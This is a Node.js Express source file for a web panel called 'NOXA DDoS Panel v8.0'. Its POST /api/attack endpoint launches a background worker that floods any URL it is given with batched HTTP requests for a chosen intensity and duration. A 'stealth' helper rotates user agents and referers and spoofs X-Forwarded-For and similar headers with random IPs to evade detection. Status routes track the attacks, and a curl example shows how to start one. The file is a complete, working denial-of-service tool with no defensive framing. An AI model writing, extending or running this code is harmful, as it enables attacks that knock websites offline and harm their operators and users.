const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type']
}));

// In-memory store
const attacks = new Map();

// User Agents Database
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36'
];

// Referers
const referers = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.twitter.com/'
];

// Helper functions
function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

async function makeStealthRequest(targetUrl) {
    try {
        // Random delay
        await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
        
        const headers = {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': generateRandomIP(),
            'X-Real-IP': generateRandomIP(),
            'X-Client-IP': generateRandomIP()
        };

        const response = await axios.get(targetUrl, {
            headers,
            timeout: 8000,
            maxRedirects: 2,
            validateStatus: () => true
        });
        
        return {
            success: true,
            status: response.status,
            userAgent: headers['User-Agent'].substring(0, 30)
        };
        
    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
}

// =============== ROUTES ===============

// Health check
app.get('/api', (req, res) => {
    res.json({
        status: 'online',
        service: 'NOXA DDoS Panel v8.0',
        timestamp: new Date().toISOString(),
        endpoints: [
            'POST /api/attack - Start attack',
            'GET /api/status - List all attacks',
            'GET /api/status/:id - Get attack details',
            'GET /api/system - System status'
        ]
    });
});

// Start attack - POST only
app.post('/api/attack', async (req, res) => {
    console.log('📡 POST /api/attack called with:', req.body);
    
    try {
        const { url, intensity = 30, duration = 30 } = req.body;
        
        if (!url || !url.startsWith('http')) {
            return res.status(400).json({ 
                success: false, 
                error: 'URL must start with http:// or https://' 
            });
        }
        
        const attackId = `noxa_${uuidv4().substring(0, 8)}`;
        const intensityNum = Math.min(Math.max(parseInt(intensity), 10), 100);
        const durationNum = Math.min(Math.max(parseInt(duration), 10), 300);
        
        const attackData = {
            id: attackId,
            url,
            intensity: intensityNum,
            startTime: Date.now(),
            endTime: Date.now() + (durationNum * 1000),
            requestsSent: 0,
            requestsSuccess: 0,
            requestsFailed: 0,
            active: true
        };
        
        attacks.set(attackId, attackData);
        
        // Start attack in background
        startAttack(attackId, url, intensityNum, durationNum);
        
        res.json({
            success: true,
            attackId,
            message: `🚀 Attack launched against ${url}`,
            intensity: intensityNum,
            duration: durationNum,
            estimatedRequests: intensityNum * durationNum,
            monitorUrl: `/api/status?id=${attackId}`
        });
        
    } catch (error) {
        console.error('Attack error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// GET /api/attack should return info, not start attack
app.get('/api/attack', (req, res) => {
    res.json({
        endpoint: 'NOXA Attack API',
        method: 'POST',
        note: 'Use POST method to start attack',
        parameters: {
            url: 'Target URL (required)',
            intensity: 'Requests per second (10-100)',
            duration: 'Duration in seconds (10-300)'
        },
        example: {
            curl: 'curl -X POST https://your-domain.vercel.app/api/attack -H "Content-Type: application/json" -d \'{"url":"https://example.com","intensity":50,"duration":60}\''
        }
    });
});

// Get attack status - with or without ID
app.get('/api/status', (req, res) => {
    const attackId = req.query.id || req.params.id;
    
    if (attackId) {
        // Specific attack
        const attackData = attacks.get(attackId);
        
        if (!attackData) {
            return res.status(404).json({ 
                success: false, 
                error: 'Attack not found' 
            });
        }
        
        const now = Date.now();
        const elapsed = Math.floor((now - attackData.startTime) / 1000);
        const remaining = Math.max(0, Math.floor((attackData.endTime - now) / 1000));
        
        const successRate = attackData.requestsSent > 0 
            ? ((attackData.requestsSuccess / attackData.requestsSent) * 100).toFixed(2)
            : 0;
        
        return res.json({
            success: true,
            attackId: attackData.id,
            url: attackData.url,
            intensity: attackData.intensity,
            active: attackData.active,
            elapsedTime: elapsed,
            remainingTime: remaining,
            requestsSent: attackData.requestsSent,
            requestsSuccess: attackData.requestsSuccess,
            requestsFailed: attackData.requestsFailed,
            successRate: successRate,
            requestsPerSecond: elapsed > 0 ? (attackData.requestsSent / elapsed).toFixed(2) : 0
        });
    }
    
    // List all attacks
    const allAttacks = Array.from(attacks.entries()).map(([id, data]) => ({
        id,
        url: data.url,
        active: data.active,
        requestsSent: data.requestsSent,
        successRate: data.requestsSent > 0 
            ? ((data.requestsSuccess / data.requestsSent) * 100).toFixed(2)
            : 0,
        startTime: new Date(data.startTime).toLocaleTimeString()
    }));
    
    res.json({
        success: true,
        count: allAttacks.length,
        attacks: allAttacks
    });
});

// System status
app.get('/api/system', (req, res) => {
    const activeAttacks = Array.from(attacks.values()).filter(a => a.active).length;
    
    res.json({
        success: true,
        system: 'NOXA DDoS Panel v8.0',
        status: 'operational',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memoryUsage: `${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB`,
        nodeVersion: process.version,
        activeAttacks: activeAttacks,
        totalAttacks: attacks.size,
        maxDuration: '300 seconds',
        maxIntensity: '100 requests/second'
    });
});

// Handle /api/status/:id pattern
app.get('/api/status/:id', (req, res) => {
    req.params.id = req.params.id;
    return app._router.handle(req, res);
});

// =============== ATTACK WORKER ===============

async function startAttack(attackId, targetUrl, intensity, durationSeconds) {
    console.log(`[NOXA] Starting attack ${attackId} on ${targetUrl}`);
    
    const endTime = Date.now() + (durationSeconds * 1000);
    
    while (Date.now() < endTime) {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.active) break;
        
        const batchSize = Math.min(intensity, 20);
        const batchPromises = [];
        
        for (let i = 0; i < batchSize; i++) {
            batchPromises.push(makeStealthRequest(targetUrl));
        }
        
        try {
            const results = await Promise.allSettled(batchPromises);
            
            attackData.requestsSent += batchSize;
            attackData.requestsSuccess += results.filter(r => 
                r.status === 'fulfilled' && r.value.success
            ).length;
            attackData.requestsFailed += results.filter(r => 
                r.status === 'rejected' || (r.status === 'fulfilled' && !r.value.success)
            ).length;
            
            attacks.set(attackId, attackData);
            
        } catch (error) {
            console.error(`Batch error for ${attackId}:`, error.message);
        }
        
        const delay = Math.max(50, 1000 / intensity);
        await new Promise(resolve => setTimeout(resolve, delay));
    }
    
    // Mark as completed
    const attackData = attacks.get(attackId);
    if (attackData) {
        attackData.active = false;
        attackData.completedAt = Date.now();
        attacks.set(attackId, attackData);
        
        console.log(`[NOXA] Attack ${attackId} completed. Requests: ${attackData.requestsSent}`);
    }
    
    // Auto cleanup setelah 10 menit
    setTimeout(() => {
        attacks.delete(attackId);
    }, 600000);
}

// =============== SERVER START ===============

const PORT = process.env.PORT || 3000;

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`🚀 NOXA Panel running on port ${PORT}`);
        console.log(`📡 Endpoints:`);
        console.log(`   POST /api/attack - Start attack`);
        console.log(`   GET  /api/status - Check status`);
        console.log(`   GET  /api/system - System info`);
    });
}

module.exports = app;
